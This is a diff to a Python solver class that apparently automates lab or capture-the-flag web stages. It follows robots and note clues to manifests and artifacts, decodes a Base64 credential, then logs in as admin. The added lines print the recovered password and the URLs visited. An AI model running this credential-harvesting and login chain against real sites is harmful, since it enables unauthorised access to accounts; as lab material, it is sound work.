@@ -183,6 +183,8 @@ class HXTerminal:
         print(f"[test1] credential marker found: {secret_key}")
         print(f"[test1] artifact URL: {secret_url}")
         print("[test1] decoded credential recovered")
+        print("[test1] recovered username: admin")
+        print(f"[test1] recovered password: {secret}")
 
         login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "login")
         body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
@@ -219,9 +221,12 @@ class HXTerminal:
         print("[test2] robots clue recovered")
 
         manifest_path: Optional[str] = None
+        note_url: Optional[str] = None
         for note_path in note_paths:
-            note = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", note_path.lstrip("/")))
+            current_note_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", note_path.lstrip("/"))
+            note = self.request(current_note_url)
             if note.status == 200 and build in note.text:
+                note_url = current_note_url
                 candidates = [p for p in PATH_RE.findall(note.text) if p.startswith("/test2/")]
                 for candidate in candidates:
                     if build in candidate:
@@ -233,7 +238,8 @@ class HXTerminal:
             manifest_path = f"/test2/releases/{build}.manifest"
         print("[test2] notes/build clue recovered")
 
-        manifest = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_path.lstrip("/")))
+        manifest_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_path.lstrip("/"))
+        manifest = self.request(manifest_url)
         if manifest.status != 200:
             print(f"[test2] manifest unavailable; status={manifest.status}")
             return False
@@ -245,18 +251,27 @@ class HXTerminal:
 
         secret: Optional[str] = None
         secret_key: Optional[str] = None
+        artifact_url: Optional[str] = None
         for artifact_path in artifact_paths:
-            artifact = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/")))
+            current_artifact_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/"))
+            artifact = self.request(current_artifact_url)
             if artifact.status == 200:
                 found = extract_b64_secret(artifact.text)
                 if found:
                     secret_key, secret = found
+                    artifact_url = current_artifact_url
                     break
         if not secret:
             print("[test2] no Base64 credential marker found in chained artifact")
             return False
         print(f"[test2] credential marker found: {secret_key}")
+        if note_url:
+            print(f"[test2] notes URL: {note_url}")
+        print(f"[test2] manifest URL: {manifest_url}")
+        print(f"[test2] artifact URL: {artifact_url}")
         print("[test2] decoded credential recovered")
+        print("[test2] recovered username: admin")
+        print(f"[test2] recovered password: {secret}")
 
         body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
         res = self.request(login_url, method="POST", data=body)
